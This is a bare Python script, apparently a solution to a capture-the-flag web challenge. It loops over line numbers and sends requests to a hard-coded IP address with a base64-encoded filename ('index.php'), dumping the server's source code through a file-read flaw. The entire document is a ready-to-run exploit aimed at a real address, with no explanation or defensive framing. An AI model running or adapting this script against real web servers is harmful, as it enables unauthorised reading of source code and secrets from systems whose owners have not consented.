import requests
test = 100
for i in range(test):
    url = "http://123.206.87.240:8002/web11/index.php?line=" + str(
        i) + "&filename=aW5kZXgucGhw"
    content = requests.get(url)
    print(content.text)
